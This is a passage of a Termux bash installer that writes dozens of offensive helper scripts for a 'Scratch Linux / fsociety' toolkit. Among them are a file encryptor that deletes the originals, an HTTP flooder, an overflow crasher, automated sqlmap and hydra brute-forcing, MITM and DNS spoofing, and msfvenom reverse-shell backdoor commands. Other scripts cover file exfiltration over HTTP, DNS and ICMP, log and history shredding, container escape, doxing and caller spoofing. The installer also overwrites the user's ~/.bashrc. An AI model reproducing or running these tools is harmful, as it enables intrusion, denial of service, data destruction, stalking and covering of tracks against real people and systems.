        dox) cat > "$SC/bin/scratch-dox" << 'DOXEOF'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in search)echo "[*] Searching $2...";echo "https://haveibeenpwned.com/account/$2";echo "site:pastebin.com $2";;
profile)scratch-osint nick "$2";scratch-dox search "$2";;
*)echo "dox search <name/email> | profile <username>";;esac
DOXEOF
        ;;
        cryptor) cat > "$SC/bin/scratch-cryptor" << 'CREOF'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in encrypt)echo -n "Password: ";read -s P;echo;find . -type f 2>/dev/null|while read f;do openssl enc -aes-256-cbc -pbkdf2 -salt -in "$f" -out "${f}.cryptor" -pass pass:"$P" 2>/dev/null&&rm -f "$f";done;echo "[OK] Done";;
decrypt)echo -n "Password: ";read -s P;echo;find . -name "*.cryptor"|while read f;do openssl enc -d -aes-256-cbc -pbkdf2 -in "$f" -out "${f%.cryptor}" -pass pass:"$P" 2>/dev/null&&rm -f "$f";done;echo "[OK] Done";;
*)echo "cryptor encrypt|decrypt";;esac
CREOF
        ;;
        dns-spoof) cat > "$SC/bin/scratch-dns-spoof" << 'DNSEOF'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in start)echo "[*] Run: bettercap -iface ${2:-wlan0} -eval \"set dns.spoof.all true; dns.spoof on\"";;
add)mkdir -p "$HOME/.scratch/dns_spoof";echo "$2 $3" >> "$HOME/.scratch/dns_spoof/hosts.txt";echo "[OK] Added: $2 -> $3";;
*)echo "dns-spoof start|add <domain> <ip>";;esac
DNSEOF
        ;;
        caller) cat > "$SC/bin/scratch-caller" << 'CALEOF'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in spoof)echo "Services: spoofcard.com | twilio.com";;
record)echo "termux-microphone-record -f call.wav";;
voice)echo "sox input.wav output.wav pitch +300";;
*)echo "caller spoof|record|voice";;esac
CALEOF
        ;;
        storm) cat > "$SC/bin/scratch-storm" << 'STEOF'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in start)echo "[*] Storm on $2";for i in {1..50};do curl -s "$2">/dev/null 2>&1&done;echo "[OK] 50 threads";wait;;
cloud)echo "AWS/GCP/Azure free tier";;stop)pkill -f "curl -s";echo "[OK]";;
*)echo "storm start <url> | cloud | stop";;esac
STEOF
        ;;
    esac
    chmod +x "$SC/bin/scratch-$mod"
    ln -sf "$SC/bin/scratch-$mod" "$SC/bin/$mod" 2>/dev/null
done

# ANON PRO
cat > "$SC/bin/scratch-anon-max" << 'ANONMAX'
#!/data/data/com.termux/files/usr/bin/bash
mkdir -p "$HOME/.scratch/anon"
case "$1" in start)echo "[*] Multi-hop starting...";pkg install tor i2pd -y 2>/dev/null;tor > /dev/null 2>&1 & sleep 2;i2pd > /dev/null 2>&1 &
cat > "$HOME/.scratch/anon/proxychains.conf" << 'PC'
strict_chain
[ProxyList]
socks4 127.0.0.1 9050
socks5 127.0.0.1 4447
PC
echo "[OK] Multi-hop active. Use: proxychains <cmd>";;
stop)pkill tor 2>/dev/null;pkill i2pd 2>/dev/null;echo "[OK] Stopped";;
status)echo -n "Tor: ";curl -s --socks5 127.0.0.1:9050 ifconfig.me 2>/dev/null||echo "DOWN";echo -n "Direct: ";curl -s ifconfig.me 2>/dev/null||echo "?";;
*)echo "anon-max start|stop|status";;esac
ANONMAX
chmod +x "$SC/bin/scratch-anon-max"

cat > "$SC/bin/scratch-anon-rotate" << 'ROTATE'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in start)INTERVAL="${2:-300}";echo "[*] Rotating every ${INTERVAL}s...";while true;do pkill -HUP tor 2>/dev/null;sleep 2;NEWIP=$(torsocks curl -s ifconfig.me 2>/dev/null||echo "?");echo "[$(date +%H:%M:%S)] New IP: $NEWIP";sleep "$INTERVAL";done;;
stop)pkill -f "anon-rotate" 2>/dev/null;echo "[OK] Stopped";;
status)echo "Current IP: $(torsocks curl -s ifconfig.me 2>/dev/null||echo '?')";;
*)echo "anon-rotate start [sec]|stop|status";;esac
ROTATE
chmod +x "$SC/bin/scratch-anon-rotate"

cat > "$SC/bin/scratch-ghost" << 'GHOST'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in random)UAS=("Mozilla/5.0 (Windows NT 10.0)" "Mozilla/5.0 (Macintosh)" "Mozilla/5.0 (X11; Linux)" "Mozilla/5.0 (iPhone)" "Mozilla/5.0 (Android 14)");export HTTP_USER_AGENT="${UAS[$((RANDOM%5))]} Safari/537.36";echo "[OK] Fingerprint randomized";;
show)echo "User-Agent: ${HTTP_USER_AGENT:-default}";;
*)echo "ghost random|show";;esac
GHOST
chmod +x "$SC/bin/scratch-ghost"

cat > "$SC/bin/scratch-noise" << 'NOISE'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in start)(while true;do SITES=("google.com" "youtube.com" "facebook.com" "amazon.com" "wikipedia.org");SITE="${SITES[$((RANDOM%5))]}";curl -s -o /dev/null "https://$SITE" 2>/dev/null;sleep $((RANDOM%10+1));done)&
(while true;do DOMAINS=("mail.ru" "vk.com" "ok.ru" "yandex.ru" "github.com");DOMAIN="${DOMAINS[$((RANDOM%5))]}";host "$DOMAIN" > /dev/null 2>&1;sleep $((RANDOM%15+5));done)&
echo "[OK] Noise active";;
stop)pkill -f "curl -s -o /dev/null https" 2>/dev/null;pkill -f "host.*com" 2>/dev/null;echo "[OK] Stopped";;
*)echo "noise start|stop";;esac
NOISE
chmod +x "$SC/bin/scratch-noise"

# FSOCIETY
cat > "$SC/bin/scratch-autopwn" << 'AUTOPWN'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: autopwn <target>";exit 1;}
T="$1";D="$HOME/.scratch/pentest/autopwn_$(date +%Y%m%d_%H%M%S)";mkdir -p "$D"
echo "[Phase 1/6] Recon...";whois "$T">"$D/whois.txt"&dig ANY "$T">"$D/dns.txt"&curl -s "https://crt.sh/?q=%25.$T&output=json"|python3 -c "import sys,json;d=json.load(sys.stdin);[print(s.get('name_value','')) for s in d]"|sort -u>"$D/subdomains.txt" 2>/dev/null&wait
echo "[Phase 2/6] Port Scan...";nmap -F -sV "$T" -oN "$D/nmap.txt" 2>/dev/null
echo "[Phase 3/6] Vulns...";nmap --script vuln "$T" -oN "$D/vulns.txt" 2>/dev/null
echo "[Phase 4/6] Web...";curl -sI "https://$T">"$D/headers.txt" 2>/dev/null
echo "[Phase 5/6] SQL...";sqlmap -u "https://$T" --batch --dbs 2>/dev/null>"$D/sqlmap.txt"&
echo "[Phase 6/6] Report: $D/REPORT.txt"
cat>"$D/REPORT.txt"<<EOF
AUTOPWN REPORT: $T — $(date)
Subdomains: $(wc -l < $D/subdomains.txt 2>/dev/null||echo 0)
Open Ports: $(grep -c open $D/nmap.txt 2>/dev/null||echo 0)
Files: $D/
EOF
echo "[OK] Done"
AUTOPWN
chmod +x "$SC/bin/scratch-autopwn"

cat > "$SC/bin/scratch-0day" << 'ZERODAY'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in
    fuzz)[ -z "$2" ]&&{ echo "Usage: 0day fuzz <target:port>";exit 1;};echo "[*] Fuzzing $2...";for i in {1..50};do PAYLOAD=$(dd if=/dev/urandom bs=$((RANDOM%512+1)) count=1 2>/dev/null|base64);echo "$PAYLOAD"|nc -w 1 $2 2>/dev/null;done;echo "[OK] Done";;
    crash)[ -z "$2" ]&&{ echo "Usage: 0day crash <target:port>";exit 1;};python3 -c "import socket;s=socket.socket();s.connect(('${2%:*}',int('${2#*:}')));s.send(b'A'*10000)" 2>/dev/null;echo "[OK] Sent 10KB overflow payload";;
    *)echo "0day fuzz|crash <target:port>";;
esac
ZERODAY
chmod +x "$SC/bin/scratch-0day"

cat > "$SC/bin/scratch-mitm" << 'MITM'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in
    start)IFACE="${2:-wlan0}";echo "[*] MITM starting on $IFACE...";echo "1. bettercap -iface $IFACE"
echo "2. set arp.spoof.targets=$(ip route|grep default|awk '{print $3}')"
echo "3. arp.spoof on; dns.spoof on; http.proxy on";;
    stop)pkill bettercap 2>/dev/null;echo "[OK] Stopped";;
    *)echo "mitm start [iface] | stop";;
esac
MITM
chmod +x "$SC/bin/scratch-mitm"

cat > "$SC/bin/scratch-webpwn" << 'WEBPWN'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: webpwn <url>";exit 1;}
echo "[*] Web exploitation on $1..."
echo "[*] SQLi test...";sqlmap -u "$1" --batch --level=1 --risk=1 --dbs 2>/dev/null>"$HOME/.scratch/pentest/sqlmap_$(date +%H%M%S).txt"&
echo "[*] XSS test...";curl -s "$1"|grep -i "<script>" >/dev/null&&echo "  Possible XSS"||echo "  No XSS found"
echo "[*] Dir brute...";dirb "$1" -o "$HOME/.scratch/pentest/dirb_$(date +%H%M%S).txt" 2>/dev/null&
echo "[OK] Scans launched"
WEBPWN
chmod +x "$SC/bin/scratch-webpwn"

cat > "$SC/bin/scratch-privesc" << 'PRIVESC'
#!/data/data/com.termux/files/usr/bin/bash
echo "[*] Privilege Escalation Checker"
echo "[*] SUID files:";find / -perm -4000 -type f 2>/dev/null|head -10
echo "[*] Sudo version:";sudo -V 2>/dev/null|head -1
echo "[*] Kernel: $(uname -r)"
echo "Known: CVE-2022-0847 (DirtyPipe), CVE-2021-4034 (PwnKit), CVE-2024-1086 (SLAB)"
PRIVESC
chmod +x "$SC/bin/scratch-privesc"

cat > "$SC/bin/scratch-pivot" << 'PIVOT'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in
    ssh)echo "[*] SSH pivot: ssh -D 1080 user@$2";echo "  Then: proxychains <cmd>";;
    meterpreter)echo "[*] Meterpreter: run autoroute -s $2";;
    chisel)echo "[*] Chisel: ./chisel server -p 8080 --reverse";;
    *)echo "pivot ssh|meterpreter|chisel <target>";;
esac
PIVOT
chmod +x "$SC/bin/scratch-pivot"

cat > "$SC/bin/scratch-persist" << 'PERSIST'
#!/data/data/com.termux/files/usr/bin/bash
echo "[*] Persistence methods:"
echo "  Linux: @reboot crontab, .bashrc, systemd service"
echo "  Windows: schtasks, registry Run, WMI event"
echo "  Android: boot receiver, Accessibility Service"
echo "  Generate: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o backdoor"
PERSIST
chmod +x "$SC/bin/scratch-persist"

cat > "$SC/bin/scratch-exfil" << 'EXFIL'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in
    dns)echo "[*] DNS tunnel: dnscat2 --dns server=$2";;
    icmp)echo "[*] ICMP tunnel: ptunnel -p $2";;
    http)echo "[*] HTTP exfil: curl -X POST -d @file https://$2";;
    *)echo "exfil dns|icmp|http <server>";;
esac
EXFIL
chmod +x "$SC/bin/scratch-exfil"

cat > "$SC/bin/scratch-wipe" << 'WIPE'
#!/data/data/com.termux/files/usr/bin/bash
echo "[*] Wipe methods:"
echo "  Logs: shred -u /var/log/*"
echo "  History: shred -u ~/.bash_history"
echo "  Files: shred -n 7 -u file.txt (DoD 5220.22-M)"
echo "  Free: dd if=/dev/urandom of=/tmp/fill bs=1M; rm /tmp/fill"
echo "  Swap: swapoff -a; dd if=/dev/urandom of=/dev/swap; swapon -a"
WIPE
chmod +x "$SC/bin/scratch-wipe"

cat > "$SC/bin/scratch-container" << 'CONTAINER'
#!/data/data/com.termux/files/usr/bin/bash
echo "[*] Container attacks:"
echo "  Docker socket: docker -H $2 run -v /:/host alpine chroot /host"
echo "  Escape: nsenter --mount --uts --ipc --net --pid --target 1"
echo "  Capabilities: capsh --print | grep cap_sys_admin"
echo "  CVE-2022-0492: unshare -UrmC bash"
CONTAINER
chmod +x "$SC/bin/scratch-container"

# OSINT
cat > "$SC/bin/scratch-leaks" << 'LEAKS'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in check)[ -z "$2" ]&&{ echo "Usage: leaks check <email>";exit 1;};echo "[*] Checking $2...";curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$2" 2>/dev/null|python3 -c "import sys,json;d=json.load(sys.stdin);[print(f'  Leak: {b.get(\"Name\",\"?\")}') for b in d]" 2>/dev/null||echo "  No leaks found";;
search)[ -z "$2" ]&&{ echo "Usage: leaks search <keyword>";exit 1;};echo "[*] Searching leaks for $2...";echo "https://haveibeenpwned.com/account/$2";;
*)echo "leaks check <email> | search <keyword>";;esac
LEAKS
chmod +x "$SC/bin/scratch-leaks"

cat > "$SC/bin/scratch-graph" << 'GRAPH'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: graph <username>";exit 1;}
echo "[*] Building connection graph for $1..."
echo "  $1"
echo "  ├── github.com/$1"
echo "  ├── twitter.com/$1"
echo "  ├── instagram.com/$1"
echo "  ├── reddit.com/user/$1"
echo "  ├── t.me/$1"
echo "  └── youtube.com/@$1"
GRAPH
chmod +x "$SC/bin/scratch-graph"

cat > "$SC/bin/scratch-exif" << 'EXIF'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: exif <image>";exit 1;};[ ! -f "$1" ]&&{ echo "[!] File not found";exit 1;}
echo "[*] Extracting EXIF from $1...";exiftool "$1" 2>/dev/null||echo "[!] Install: spm install exiftool"
EXIF
chmod +x "$SC/bin/scratch-exif"

cat > "$SC/bin/scratch-profile" << 'PROFILE'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: profile <name/email/phone>";exit 1;}
echo "[*] Building digital profile for $1..."
echo "[*] Social networks:";scratch-osint nick "$1" 2>/dev/null
echo "[*] Data leaks:";scratch-leaks check "$1" 2>/dev/null
echo "[*] Files:";echo "  site:pastebin.com $1"
PROFILE
chmod +x "$SC/bin/scratch-profile"

cat > "$SC/bin/scratch-cve" << 'CVE'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in search)[ -z "$2" ]&&{ echo "Usage: cve search <CVE-ID>";exit 1;};curl -s "https://cve.circl.lu/api/cve/$2" 2>/dev/null|python3 -c "import sys,json;d=json.load(sys.stdin);print(f\"CVE: {d.get('id','?')}\nScore: {d.get('cvss','?')}\nSummary: {d.get('summary','?')}\")" 2>/dev/null;;
scan)[ -z "$2" ]&&{ echo "Usage: cve scan <service:version>";exit 1;};echo "[*] Searching CVEs for $2...";searchsploit "$2" 2>/dev/null||echo "[!] Install: spm install exploitdb";;
*)echo "cve search <CVE-ID> | scan <service:version>";;esac
CVE
chmod +x "$SC/bin/scratch-cve"

cat > "$SC/bin/scratch-phone" << 'PHONE'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: phone <number>";exit 1;}
echo "[*] Phone lookup: $1"
curl -s "https://htmlweb.ru/geo/api.php?json&telcod=$1" 2>/dev/null|python3 -c "import sys,json;d=json.load(sys.stdin);print(f\"Country: {d.get('country','?')}\nRegion: {d.get('region','?')}\nOperator: {d.get('oper','?')}\")" 2>/dev/null
echo "[*] Linked: https://wa.me/$1 | https://t.me/+$1"
PHONE
chmod +x "$SC/bin/scratch-phone"

cat > "$SC/bin/scratch-dark" << 'DARK'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in search)[ -z "$2" ]&&{ echo "Usage: dark search <keyword>";exit 1;};echo "[*] Searching darknet for $2...";echo "  Ahmia: http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/search?q=$2";;
scan)[ -z "$2" ]&&{ echo "Usage: dark scan <onion_url>";exit 1;};echo "[*] Scanning $2...";torsocks curl -s "$2" 2>/dev/null|head -20||echo "[!] Start Tor first: anon start";;
*)echo "dark search <keyword> | scan <onion_url>";;esac
DARK
chmod +x "$SC/bin/scratch-dark"

# PENTEST
cat > "$SC/bin/scratch-webscan" << 'WEBSCAN'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: webscan <url>";exit 1;}
echo "[*] Web vulnerability scan on $1..."
echo "[*] SQLi...";sqlmap -u "$1" --batch --level=1 --risk=1 --dbs 2>/dev/null>"$HOME/.scratch/pentest/sqli_$(date +%H%M%S).txt"&
echo "[*] XSS...";curl -s "$1?q=<script>alert(1)</script>" 2>/dev/null|grep -o "<script>alert(1)</script>"&&echo "  VULNERABLE!"||echo "  Not found"
echo "[OK] Scans launched"
WEBSCAN
chmod +x "$SC/bin/scratch-webscan"

cat > "$SC/bin/scratch-subnet" << 'SUBNET'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: subnet <network>";exit 1;}
echo "[*] Scanning subnet $1...";nmap -sn "$1" -oN "$HOME/.scratch/pentest/subnet_$(date +%H%M%S).txt" 2>/dev/null||echo "[!] Install: spm install nmap"
SUBNET
chmod +x "$SC/bin/scratch-subnet"

cat > "$SC/bin/scratch-brute" << 'BRUTE'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in ssh)[ -z "$2" ]&&{ echo "Usage: brute ssh <user@host>";exit 1;};echo "[*] SSH brute on $2...";hydra -l ${2%@*} -P ~/rockyou.txt ssh://${2#*@} 2>/dev/null||echo "[!] Install: spm install hydra";;
ftp)[ -z "$2" ]&&{ echo "Usage: brute ftp <host>";exit 1;};echo "[*] FTP brute on $2...";hydra -L ~/users.txt -P ~/rockyou.txt ftp://$2 2>/dev/null;;
web)[ -z "$2" ]&&{ echo "Usage: brute web <url>";exit 1;};echo "[*] Web brute on $2...";hydra -L ~/users.txt -P ~/rockyou.txt $2 http-post-form "/login:user=^USER^&pass=^PASS^:F=error" 2>/dev/null;;
*)echo "brute ssh|ftp|web <target>";;esac
BRUTE
chmod +x "$SC/bin/scratch-brute"

cat > "$SC/bin/scratch-post" << 'POST'
#!/data/data/com.termux/files/usr/bin/bash
echo "[*] Post-exploitation tools:"
echo "  Keylogger: msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 R > payload.apk"
echo "  Passwords: mimikatz, LaZagne, firefox_decrypt"
echo "  Persist: scratch-persist"
echo "  Exfil: scratch-exfil"
POST
chmod +x "$SC/bin/scratch-post"

cat > "$SC/bin/scratch-wpscan" << 'WPSCAN'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: wpscan <url>";exit 1;}
echo "[*] WordPress scan on $1...";wpscan --url "$1" --enumerate vp,vt,u --disable-tls-checks 2>/dev/null>"$HOME/.scratch/pentest/wpscan_$(date +%H%M%S).txt"||echo "[!] Install: spm install wpscan"
WPSCAN
chmod +x "$SC/bin/scratch-wpscan"

cat > "$SC/bin/scratch-sqli" << 'SQLI'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: sqli <url>";exit 1;}
echo "[*] Automated SQL injection on $1...";sqlmap -u "$1" --batch --dbs --threads=4 --random-agent 2>/dev/null>"$HOME/.scratch/pentest/sqli_full_$(date +%H%M%S).txt"&
echo "[OK] Launched. Check ~/.scratch/pentest/"
SQLI
chmod +x "$SC/bin/scratch-sqli"

cat > "$SC/bin/scratch-xss" << 'XSS'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: xss <url>";exit 1;}
echo "[*] XSS test on $1...";curl -s "$1?q=<script>alert(1)</script>" 2>/dev/null|grep -o "<script>alert(1)</script>"&&echo "  VULNERABLE!"||echo "  Not found"
XSS
chmod +x "$SC/bin/scratch-xss"

cat > "$SC/bin/scratch-droid" << 'DROID'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: droid <apk_file>";exit 1;};[ ! -f "$1" ]&&{ echo "[!] File not found";exit 1;}
echo "[*] Android APK analysis: $1";echo "[*] Strings:";strings "$1"|grep -iE "http|https|key|secret|password|token"|head -10
DROID
chmod +x "$SC/bin/scratch-droid"

cat > "$SC/bin/scratch-soceng" << 'SOCENG'
#!/data/data/com.termux/files/usr/bin/bash
echo "[*] Social Engineering Toolkit"
echo "  Phishing: scratch-phish"
echo "  Spoof call: scratch-caller spoof"
echo "  Pretext: bank, tech support, HR"
SOCENG
chmod +x "$SC/bin/scratch-soceng"

cat > "$SC/bin/scratch-wordgen" << 'WORDGEN'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: wordgen <name> [birthyear] [city] [pet]";exit 1;}
NAME="${1}";YEAR="${2:-1990}";CITY="${3:-moscow}";PET="${4:-cat}"
OUT="$HOME/.scratch/pentest/wordlist_${NAME}.txt"
echo "[*] Generating wordlist for $NAME..."
echo "$NAME" > "$OUT";echo "${NAME}${YEAR}" >> "$OUT";echo "${NAME}@${YEAR}" >> "$OUT";echo "${CITY}${YEAR}" >> "$OUT";echo "${PET}${NAME}" >> "$OUT";echo "${NAME}123" >> "$OUT";echo "${NAME}${YEAR}!" >> "$OUT"
echo "[OK] Wordlist: $OUT ($(wc -l < $OUT) words)"
WORDGEN
chmod +x "$SC/bin/scratch-wordgen"

cat > "$SC/bin/scratch-api" << 'API'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: api <url>";exit 1;}
echo "[*] API scan on $1..."
for ep in /api /api/v1 /graphql /swagger /docs /openapi.json /api/users /api/login;do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$1$ep" 2>/dev/null)
    [ "$code" != "404" ]&&echo "  $ep -> HTTP $code"
done
API
chmod +x "$SC/bin/scratch-api"

cat > "$SC/bin/scratch-report" << 'REPORT'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: report <target>";exit 1;}
R="$HOME/.scratch/pentest/report_$(date +%Y%m%d_%H%M%S).txt"
cat>"$R"<<EOF
╔══════════════════════════════════════════════╗
║   PENTEST REPORT                             ║
║   Target: $1                                 ║
║   Date: $(date)                              ║
╚══════════════════════════════════════════════╝
[SUMMARY] Target: $1
[FINDINGS] $(cat "$HOME/.scratch/pentest/"*.txt 2>/dev/null|head -50)
[TOOLS] Scratch Linux + fsociety Suite
EOF
echo "[OK] Report: $R"
REPORT
chmod +x "$SC/bin/scratch-report"

cat > "$SC/bin/scratch-reverse" << 'REVERSE'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: reverse <binary>";exit 1;};[ ! -f "$1" ]&&{ echo "[!] File not found";exit 1;}
echo "[*] Reverse engineering $1...";echo "Type: $(file "$1")";strings "$1"|grep -iE "password|secret|key|flag|http"|head -10
REVERSE
chmod +x "$SC/bin/scratch-reverse"

cat > "$SC/bin/scratch-db" << 'DB'
#!/data/data/com.termux/files/usr/bin/bash
case "$1" in scan)[ -z "$2" ]&&{ echo "Usage: db scan <target>";exit 1;};echo "[*] Scanning databases on $2...";for port in 3306 5432 6379 27017 9200;do (timeout 1 bash -c "echo >/dev/tcp/$2/$port" 2>/dev/null&&echo "  $port: OPEN")&done;wait;;
dump)[ -z "$2" ]&&{ echo "Usage: db dump <target:port>";exit 1;};echo "[*] Dumping $2...";echo "  MySQL: mysqldump -h ${2%:*} -P ${2#*:} -u root --all-databases";;
*)echo "db scan <target> | dump <target:port>";;esac
DB
chmod +x "$SC/bin/scratch-db"

cat > "$SC/bin/scratch-ssl" << 'SSL'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: ssl <target>";exit 1;}
echo "[*] SSL/TLS analysis on $1...";openssl s_client -connect $1:443 -servername $1 </dev/null 2>/dev/null|openssl x509 -noout -text|grep -E "Issuer:|Subject:|Not Before|Not After"|head -5
SSL
chmod +x "$SC/bin/scratch-ssl"

cat > "$SC/bin/scratch-voip" << 'VOIP'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: voip <target>";exit 1;}
echo "[*] VoIP scan on $1...";nmap -p 5060,5061 --script sip-methods,sip-enum-users $1 2>/dev/null||echo "[!] Install: spm install nmap"
VOIP
chmod +x "$SC/bin/scratch-voip"

cat > "$SC/bin/scratch-logs" << 'LOGS'
#!/data/data/com.termux/files/usr/bin/bash
[ -z "$1" ]&&{ echo "Usage: logs <logfile>";exit 1;};[ ! -f "$1" ]&&{ echo "[!] File not found";exit 1;}
echo "[*] Analyzing $1...";echo "[*] IPs:";grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' "$1"|sort -u|head -10;echo "[*] Emails:";grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$1"|sort -u|head -10;echo "[*] Errors:";grep -i "error\|fail\|denied" "$1"|head -5
LOGS
chmod +x "$SC/bin/scratch-logs"

# SHORTCUTS
for cmd in "$SC/bin/scratch-"*;do [ -f "$cmd" ]||continue;short=$(basename "$cmd"|sed 's/scratch-//');[ ! -f "$SC/bin/$short" ]&&ln -sf "$cmd" "$SC/bin/$short" 2>/dev/null;done
ln -sf "$SC/bin/scratchfetch" "$SC/bin/neofetch" 2>/dev/null;ln -sf "$SC/bin/scratchfetch" "$SC/bin/nf" 2>/dev/null

cat > "$SC/bin/scratch-menu" << 'MENU'
#!/data/data/com.termux/files/usr/bin/bash
clear
echo "╔══════════════════════════════════════════════╗"
echo "║     SCRATCH LINUX — ALL COMMANDS             ║"
echo "╠══════════════════════════════════════════════╣"
echo "║  SYSTEM:  neofetch sysinfo matrix hack       ║"
echo "║  TOOLS:   spm fm browser store cloud backup  ║"
echo "║  ARSENAL: scan osint stego deanon pentest    ║"
echo "║  PRO:     obfuscate hijack c2 anon root vault║"
echo "║  ATTACK:  swarm exploit phish wifi-crack dox ║"
echo "║           cryptor dns-spoof caller storm     ║"
echo "║  ANON:    anon-max anon-rotate ghost noise   ║"
echo "║  FSOCIETY: autopwn 0day mitm webpwn privesc  ║"
echo "║            pivot persist exfil wipe container║"
echo "║  OSINT:   leaks graph exif profile cve phone ║"
echo "║           dark                               ║"
echo "║  PENTEST: webscan subnet brute post wpscan   ║"
echo "║           sqli xss droid soceng wordgen api  ║"
echo "║           report reverse db ssl voip logs    ║"
echo "╚══════════════════════════════════════════════╝"
MENU
chmod +x "$SC/bin/scratch-menu"

cat > "$SC/.bashrc" << 'BASHRC'
export HOME="/data/data/com.termux/files/home";export USER="root";export HOSTNAME="localscratch"
export PATH="$HOME/.scratch/bin:/data/data/com.termux/files/usr/bin:$PATH"
alias ls='ls --color=auto';alias ll='ls -la';alias cls='clear';alias ..='cd ..'
alias neofetch='scratchfetch';alias nf='scratchfetch';alias fm='scratch-fm';alias browser='scratch-browser'
alias store='scratch-store';alias cloud='scratch-cloud';alias backup='scratch-backup';alias convert='scratch-convert'
alias encrypt='scratch-encrypt';alias osint='scratch-osint';alias stego='scratch-stego';alias deanon='scratch-deanon'
alias scan='scratch-scan';alias hack='scratch-hack';alias pentest='scratch-pentest';alias sniff='scratch-sniff'
alias recover='scratch-recover';alias spoof='scratch-spoof';alias antidetect='scratch-antidetect'
alias spm='spm';alias sysinfo='sysinfo';alias matrix='matrix';alias fortune='fortune'
alias obfuscate='scratch-obfuscate';alias hijack='scratch-hijack';alias c2='scratch-c2';alias anon='scratch-anon'
alias root='scratch-root';alias vault-max='scratch-vault-max'
alias swarm='scratch-swarm';alias exploit='scratch-exploit';alias phish='scratch-phish'
alias wifi-crack='scratch-wifi-crack';alias dox='scratch-dox';alias cryptor='scratch-cryptor'
alias dns-spoof='scratch-dns-spoof';alias caller='scratch-caller';alias storm='scratch-storm'
alias anon-max='scratch-anon-max';alias anon-rotate='scratch-anon-rotate';alias ghost='scratch-ghost';alias noise='scratch-noise'
alias autopwn='scratch-autopwn';alias 0day='scratch-0day';alias mitm='scratch-mitm';alias webpwn='scratch-webpwn'
alias privesc='scratch-privesc';alias pivot='scratch-pivot';alias persist='scratch-persist';alias exfil='scratch-exfil'
alias wipe='scratch-wipe';alias container='scratch-container'
alias leaks='scratch-leaks';alias graph='scratch-graph';alias exif='scratch-exif';alias profile='scratch-profile'
alias cve='scratch-cve';alias phone='scratch-phone';alias dark='scratch-dark'
alias webscan='scratch-webscan';alias subnet='scratch-subnet';alias brute='scratch-brute';alias post='scratch-post'
alias wpscan='scratch-wpscan';alias sqli='scratch-sqli';alias xss='scratch-xss';alias droid='scratch-droid'
alias soceng='scratch-soceng';alias wordgen='scratch-wordgen';alias api='scratch-api';alias report='scratch-report'
alias reverse='scratch-reverse';alias db='scratch-db';alias ssl='scratch-ssl';alias voip='scratch-voip';alias logs='scratch-logs'
alias menu='scratch-menu';alias scrhelp='scratch-menu'
theme(){ eval "$(scratch-theme "$1")";}
cd ~;fortune 2>/dev/null
scratch-menu
BASHRC

cat > ~/.bashrc << 'SYSBASHRC'
source "$HOME/.scratch/.bashrc" 2>/dev/null
SYSBASHRC

chmod -R 755 "$SC/bin" 2>/dev/null
source "$SC/.bashrc" 2>/dev/null
eval "$(scratch-theme rainbow)"
exec bash
ENDSCRIPT

chmod +x ~/scratch.sh
echo "[OK] scratch.sh готов. Запуск: bash ~/scratch.sh"
